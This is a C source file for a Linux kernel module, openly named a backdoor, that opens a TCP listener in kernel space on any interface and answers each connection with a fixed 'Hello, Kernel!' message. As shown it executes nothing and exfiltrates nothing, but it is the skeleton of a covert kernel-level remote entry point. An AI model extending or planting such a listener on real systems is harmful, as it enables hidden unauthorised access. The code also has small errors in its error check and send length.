#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/tcp.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#include "backdoor_socket.h"

static struct socket *sock;
static struct task_struct *listener;

static int backdoor_socket_listen(void *_);

int __init backdoor_socket_init(int port)
{
	int err;
	struct sockaddr_in sin;

	memset(&sin, 0, sizeof(struct sockaddr_in));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons(port);

	err = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP,
			       &sock);
	if (err < 0) {
		goto errl1;
	}

	err = sock->ops->bind(sock, (struct sockaddr *)&sin, sizeof(sin));
	if (err < 0) {
		goto errl2;
	}

	err = sock->ops->listen(sock, BACKDOOR_SOCK_QUEUE_SIZE);
	if (err < 0) {
		goto errl2;
	}

	listener =
		kthread_run(backdoor_socket_listen, NULL, "backdoor listener");
	if (listener == NULL) {
		err = PTR_ERR(listener);
		goto errl2;
	}

	return 0;
errl2:
	sock_release(sock);
errl1:
	return err;
}

static void send_message(struct socket *conn)
{
	struct msghdr msg = { .msg_flags = 0 };
	struct kvec iov = {
		.iov_base = "Hello, Kernel!\n",
		.iov_len = 16,
	};

	kernel_sendmsg(conn, &msg, &iov, 0, sizeof(iov));
}

static int backdoor_socket_listen(void *_)
{
	while (true) {
		struct socket *conn = sock_alloc();
		int err;
		conn->type = sock->type;
		conn->ops = sock->ops;

		printk(KERN_INFO "backdoor: waiting on accept\n");
		err = sock->ops->accept(sock, conn, O_RDWR, true);
		if (err < 0) {
			conn->ops->release(conn);

			if (kthread_should_stop()) {
				break;
			}

			printk(KERN_ERR
			       "backdoor: error accepting connection, exiting\n");
			return err;
		}
		printk(KERN_INFO "backdoor: accepted connection\n");

		send_message(conn);

		conn->ops->shutdown(conn, SHUT_RDWR);
		conn->ops->release(conn);
	}

	printk(KERN_INFO "backdoor: exiting listener\n");
	return 0;
}

void __exit backdoor_socket_exit(void)
{
	sock->ops->shutdown(sock, SHUT_RDWR);
	kthread_stop(listener);
	sock->ops->release(sock);
}
